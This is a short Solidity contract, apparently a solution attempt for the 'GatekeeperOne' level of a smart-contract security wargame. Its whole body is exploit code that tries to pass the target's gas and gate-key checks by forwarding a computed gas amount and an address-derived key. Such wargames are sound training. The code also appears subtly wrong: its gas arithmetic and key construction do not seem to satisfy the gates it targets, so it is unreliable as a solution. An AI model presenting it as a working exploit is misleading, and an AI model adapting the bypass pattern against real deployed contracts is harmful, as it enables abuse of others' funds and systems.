pragma solidity ^0.8.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
  
  GatekeeperOne gatekeeper;
  address public originalSender;
  uint256 public gasremaining;

  constructor(address payable gatekeeperAddress) public {
    gatekeeper = GatekeeperOne(gatekeeperAddress);
    originalSender = msg.sender;
  }

  function enter() public returns (bool){
    uint multiple = gasleft()/8191;
    uint256 gasToSend = multiple * 8191;
    // (bool success,) = address(gatekeeper).call{gas: gasToSend}(abi.encodeWithSignature("enter(bytes8)", bytes8(uint64(uint160(originalSender)))));
    
    bool success = gatekeeper.enter{gas: gasToSend}(bytes8(uint64(uint160(originalSender))));
    return success;
  }
}
